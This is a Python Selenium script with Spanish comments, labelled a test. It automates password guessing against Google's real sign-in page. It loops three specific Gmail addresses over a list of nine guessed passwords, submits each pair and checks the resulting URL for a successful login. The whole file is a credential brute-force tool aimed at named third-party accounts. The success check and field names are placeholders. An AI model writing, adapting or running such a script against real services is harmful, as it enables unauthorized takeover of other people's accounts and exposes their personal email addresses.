
#ESTO ES UNA PRUEBA

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service
import time

# Ruta al Geckodriver (ajústalo a la ruta donde descargaste Geckodriver)
geckodriver_path = "/Users/armando/Downloads/geckodriver"  # Cambia esto a la ruta correcta en tu sistema

# URL de la página de inicio de sesión de tu web
login_url = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fclient%3Dfirefox-b-d%26q%3Dgoogle&ec=futura_gmv_dt_so_72586115_e&hl=es-419&ifkv=Ab5oB3qNjt7SgYh6pK2on6E-bmBXhHtJT59FOvhUPy6fN7v-OSR1yqBwfOsjqM7Xp24arSYZqRfypQ&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-365180667%3A1725533909486218&ddm=0"  # Cambia esto a la URL de tu página web

# Lista de correos electrónicos a probar
usernames = ["juanarmandow1@gmail.com", "estrellasand@gmail.com", "miranda256@gmail.com"]

# Lista de contraseñas comunes que se intentarán
passwords = ["Armando9998", "mtzarmandowere6", "password$$$888", "mi_contraseña_segura", "guzman1010123", "juanarmandomartine23888", "armando456", "mi_contraseña_segura09012", "Armando8972345"]

# Configura el navegador Firefox usando Selenium
service = Service(executable_path=geckodriver_path)
browser = webdriver.Firefox(service=service)

# Abre la página de inicio de sesión
browser.get(login_url)

# Bucle para medir el tiempo total
start_time = time.time()

# Bucle para probar cada usuario y cada contraseña
for username in usernames:
    for password in passwords:
        print(f"Probando con el correo: {username} y la contraseña: {password}")

        # Encuentra el campo de correo electrónico
        email_input = browser.find_element("name", "email")  # Cambia "name" al valor correcto si tu campo usa un atributo diferente

        # Limpia el campo antes de ingresar el valor
        email_input.clear()

        # Ingresa el nombre de usuario
        email_input.send_keys(username)

        # Encuentra el botón "Siguiente" y haz clic
        siguiente_boton = browser.find_element("name", "next_button")  # Cambia "name" al valor correcto para el botón de "Siguiente"
        siguiente_boton.click()

        # Espera un momento para cargar la nueva página
        time.sleep(2)

        # Encuentra el campo de contraseña
        password_input = browser.find_element("name", "password")  # Cambia "name" al valor correcto si tu campo usa un atributo diferente

        # Limpia el campo antes de ingresar la contraseña
        password_input.clear()

        # Ingresa la contraseña
        password_input.send_keys(password)

        # Envía el formulario de inicio de sesión
        password_input.send_keys(Keys.RETURN)

        # Espera un poco para que el servidor responda
        time.sleep(2)

        # Aquí puedes verificar si el inicio de sesión fue exitoso verificando la URL o algún mensaje en la página
        if "dashboard" in browser.current_url:  # Cambia "dashboard" por la parte de la URL que indica inicio de sesión exitoso
            print(f"Inicio de sesión exitoso con {username} y la contraseña {password}")
            break  # Si encontramos la contraseña correcta, salimos del bucle

# Tiempo total de ejecución
end_time = time.time()
total_time = end_time - start_time
print(f"Tiempo total para completar todas las pruebas: {total_time:.2f} segundos")

# Cierra el navegador después de terminar
browser.quit()
